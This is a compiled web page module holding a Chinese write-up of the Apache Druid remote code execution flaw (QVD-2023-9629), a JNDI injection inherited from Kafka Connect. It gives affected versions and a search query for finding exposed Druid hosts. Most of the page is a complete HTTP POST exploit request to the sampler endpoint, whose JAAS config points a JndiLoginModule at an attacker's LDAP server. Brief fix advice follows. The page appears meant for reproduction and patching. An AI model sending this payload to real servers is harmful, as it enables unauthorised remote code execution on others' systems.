import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as u,o as a,c as s,a as e,b as i,d as o,e as d}from"./app-58e4a7d6.js";const l={},r=d(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>该漏洞源于 Apache Kafka Connect JNDI 注入漏洞（CVE-2023-25194），Apache Druid 由于支持从 Kafka 加载数据，刚好满足其利用条件，攻击者可通过修改Kafka 连接配置属性进行 JNDI 注入攻击，进而在服务端执行任意恶意代码。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Druid &lt;= 25.0.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;Apache Druid&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问漏洞环境，点击 Load data -&gt; Streaming，进入页面后点击 Apache Kafka -&gt; Connect data：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230801093324881.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在 Bootstrap servers 和 Topic 处填入任意字符，点击 Apply，抓包。</p><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /druid/indexer/v1/sampler?for=connect HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 1437
Connection: close

{
    &quot;type&quot;:&quot;kafka&quot;,
    &quot;spec&quot;:{
        &quot;type&quot;:&quot;kafka&quot;,
        &quot;ioConfig&quot;:{
            &quot;type&quot;:&quot;kafka&quot;,
            &quot;consumerProperties&quot;:{
                &quot;bootstrap.servers&quot;:&quot;1.1.1.1:9092&quot;,
                &quot;sasl.mechanism&quot;:&quot;SCRAM-SHA-256&quot;,
                &quot;security.protocol&quot;:&quot;SASL_SSL&quot;,
                &quot;sasl.jaas.config&quot;:&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=\\&quot;ldap://your-ip\\&quot; useFirstPass=\\&quot;true\\&quot; serviceName=\\&quot;x\\&quot; debug=\\&quot;true\\&quot; group.provider.url=\\&quot;xxx\\&quot;;&quot;
            },
            &quot;topic&quot;:&quot;any&quot;,
            &quot;useEarliestOffset&quot;:true,
            &quot;inputFormat&quot;:{
                &quot;type&quot;:&quot;regex&quot;,
                &quot;pattern&quot;:&quot;([\\\\s\\\\S]*)&quot;,
                &quot;listDelimiter&quot;:&quot;56616469-6de2-9da4-efb8-8f416e6e6965&quot;,
                &quot;columns&quot;:[
                    &quot;raw&quot;
                ]
            }
        },
        &quot;dataSchema&quot;:{
            &quot;dataSource&quot;:&quot;sample&quot;,
            &quot;timestampSpec&quot;:{
                &quot;column&quot;:&quot;!!!_no_such_column_!!!&quot;,
                &quot;missingValue&quot;:&quot;1970-01-01T00:00:00Z&quot;
            },
            &quot;dimensionsSpec&quot;:{

            },
            &quot;granularitySpec&quot;:{
                &quot;rollup&quot;:false
            }
        },
        &quot;tuningConfig&quot;:{
            &quot;type&quot;:&quot;kafka&quot;
        }
    },
    &quot;samplerConfig&quot;:{
        &quot;numRows&quot;:500,
        &quot;timeoutMs&quot;:15000
    }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>修改请求包，user.provider.url 处填写你的 ldap 服务 url。</p><p>利用 DNSLog 验证漏洞是否存在。</p><h2 id="修复建议" tabindex="-1"><a class="header-anchor" href="#修复建议" aria-hidden="true">#</a> 修复建议</h2>`,15),c=e("li",null,"避免 Apache Druid 开放至公网。",-1),v={href:"https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html",target:"_blank",rel:"noopener noreferrer"};function q(m,p){const n=u("ExternalLinkIcon");return a(),s("div",null,[r,e("ul",null,[c,e("li",null,[i("开启身份认证机制,可参考官方文档："),e("a",v,[i("https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html"),o(n)])])])])}const g=t(l,[["render",q],["__file","Apache Druid 远程代码执行漏洞 QVD-2023-9629.html.vue"]]);export{g as default};
